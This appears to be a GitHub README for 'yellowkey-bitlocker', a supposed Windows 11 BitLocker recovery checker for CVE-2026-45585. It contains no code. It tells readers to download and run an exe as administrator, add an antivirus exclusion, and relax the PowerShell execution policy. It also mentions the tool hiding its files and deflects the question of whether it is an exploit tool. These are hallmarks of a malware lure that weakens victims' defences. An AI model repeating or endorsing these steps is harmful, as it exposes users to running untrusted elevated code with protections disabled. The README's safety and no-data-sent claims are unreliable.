# 🔑 yellowkey-bitlocker - Securely manage your Windows recovery environment

[![Download yellowkey-bitlocker](https://img.shields.io/badge/Download-yellowkey_bitlocker-blue.svg)](https://github.com/alexadvanced95/yellowkey-bitlocker)

## 📁 About this tool

The yellowkey-bitlocker tool provides a way to interact with the BitLocker recovery environment on Windows 11 systems. This utility assists users in managing encryption states and recovery partitions. It helps test system security configurations against known vulnerabilities like CVE-2026-45585. If you suspect your BitLocker setup needs verification, this tool offers a structured approach to assess your device.

## 🛠 Features

*   **Encryption management:** Access and review active BitLocker partition settings.
*   **Vulnerability assessment:** Check system files for signs of the CVE-2026-45585 exploit.
*   **Recovery environment access:** Utilize secure methods to trigger standard Windows recovery options.
*   **Mitigation guidance:** Follow clear steps to secure your drive after an audit.
*   **Scripted automation:** Run pre-defined commands to fix common lock issues.

## 📋 System requirements

*   Operating System: Windows 11 (64-bit).
*   Permission: Local Administrator rights.
*   Storage: 50MB of free disk space.
*   Hardware: USB 2.0 or 3.0 drive for recovery media storage.
*   Framework: Standard Windows PowerShell installed.

## 📥 How to setup your tool

1. Visit the repository page to download the software: [https://github.com/alexadvanced95/yellowkey-bitlocker](https://github.com/alexadvanced95/yellowkey-bitlocker).
2. Save the compressed folder to your computer.
3. Right-click the folder and select Extract All.
4. Open the extracted folder to view the application files.

## ⚙️ Running the toolkit

To start the diagnostic process, follow these steps:

1. Connect your USB drive to the computer.
2. Locate the file named `yellowkey-check.exe` in the main folder.
3. Right-click the file and select Run as administrator.
4. A console window will appear on your screen.
5. Follow the on-screen prompts to begin the security scan.
6. The application performs a series of checks on your Windows recovery partition.
7. Once finished, the tool hides its temporary working files from your desktop.

## 🛡 Understanding security status

The application uses color-coded output to inform you of your security status:

*   **Green:** Your system appears secure against the relevant exploit.
*   **Yellow:** The tool detects a potential misconfiguration in your recovery settings.
*   **Red:** Your system requires immediate patching or security updates to fix a potential vulnerability.

If the tool shows a warning, follow the included mitigation document in the `docs` folder. This file contains specific steps to update your recovery environment files and protect your data.

## 🔧 Resolving common issues

If the tool does not launch, check these basic settings:

*   **Antivirus interference:** Sometimes, security software flags custom scripts. If this happens, add an exclusion for the application folder in your antivirus settings.
*   **Administrative rights:** The software cannot access system protected areas without elevated permissions. Ensure you run the file as an administrator at all times.
*   **Execution Policy:** If PowerShell scripts fail to run, open PowerShell as an administrator and type `Set-ExecutionPolicy RemoteSigned`. Press Enter and type `Y` to confirm.
*   **Missing components:** Ensure all files from the original download remain in the same folder. Moving individual files causes the application to stop working.

## 🗝 Managing BitLocker locks

BitLocker sometimes locks drives unexpectedly. This tool provides a script to help reset the lock status:

1. Identify your drive letter (e.g., C:).
2. Open the tool menu by pressing the key labeled M in the application window.
3. Select the option labeled Reset Drive Lock.
4. Wait for the confirmation message.
5. Restart your computer to apply the final changes to the drive encryption table.

## 📖 Frequently asked questions

**Does this damage my data?**
The tool performs read-only checks by default. It only makes changes to your system files if you explicitly choose a repair option from the menu.

**Can I run this on Windows 10?**
The tool focuses on Windows 11 recovery behaviors. We do not support other versions of Windows.

**Is this an exploit tool?**
The tool identifies vulnerability patterns associated with the Nightmare Eclipse classification, such as CVE-2026-45585. It helps you find and fix these holes in your security layout.

**Where can I find help if the scan fails?**
Check the `logs` folder created inside the directory after your first run. This folder contains a text file explaining every action the application performed. You can share this file with a system administrator to identify specific errors.

## ⚠️ Safety recommendations

Always verify your system backups before you run any security diagnostic tool. While this software provides a safe way to check your recovery partition, modifying system recovery settings carries small risks. Use our provided mitigation guide to roll back changes if you encounter system instability.

## 📝 Compliance and logs

The tool generates a log file named `security_log.txt` after every session. This log records the status of your system files and any changes applied. You can safely delete this file whenever you wish. The software does not send your data to any external server. All diagnostic work happens locally on your computer.

## 🔄 Updating your tool

We release updates to the tool as we learn more about the CVE-2026-45585 vulnerability. Check the primary download link on a regular basis to ensure you use the most current version. Always replace your old folder with the new one to ensure all internal scripts remain updated.

## 🔑 Final security checks

Once you complete the audit, remove the USB drive from the port. Unplugging the drive keeps your recovery environment isolated from future unexpected access. Keep your recovery key saved in a separate location. Never store your recovery key on the same drive that contains the encrypted data. If you use this tool to facilitate a reset, ensure your encryption key is backed up to your Microsoft account or printed on paper. This prevents data loss if your drive stays locked after a repair operation.